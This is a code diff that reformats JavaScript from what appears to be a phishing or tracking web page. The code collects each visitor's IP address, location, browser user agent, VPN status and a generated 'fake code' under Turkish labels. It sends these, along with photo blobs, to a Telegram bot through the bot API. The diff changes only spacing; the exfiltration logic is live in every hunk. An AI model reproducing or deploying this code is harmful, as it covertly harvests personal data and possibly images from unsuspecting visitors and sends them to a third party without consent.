@@ -148,16 +148,16 @@ function generateFakeCode() {
 
 async function sendTelegramMessage(chat_id, text, blob=null) {
   if(blob){
-    const formData=new FormData();
-    formData.append("chat_id",chat_id);
-    formData.append("photo",blob,"photo.jpg");
-    formData.append("caption",text);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
+    const formData = new FormData();
+    formData.append("chat_id", chat_id);
+    formData.append("photo", blob, "photo.jpg");
+    formData.append("caption", text);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:"POST", body:formData});
   } else {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method:"POST",
       headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id,text}),
+      body:JSON.stringify({chat_id, text})
     });
   }
 }
@@ -168,9 +168,9 @@ async function getIPData() {
 }
 
 async function collectUserData(fakeCode){
-  const ipData=await getIPData();
-  const userAgent=navigator.userAgent;
-  const vpnProxy=(ipData.security && ipData.security.vpn)?"Evet":"Hayır";
+  const ipData = await getIPData();
+  const userAgent = navigator.userAgent;
+  const vpnProxy = (ipData.security && ipData.security.vpn) ? "Evet" : "Hayır";
   return `📡 IP: ${ipData.ip || "Bilinmiyor"}\n🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}\n🏙️ Şehir: ${ipData.city || "Bilinmiyor"}\n📱 Tarayıcı: ${userAgent}\n🔐 VPN: ${vpnProxy}\n💻 Kod: ${fakeCode}`;
 }
 
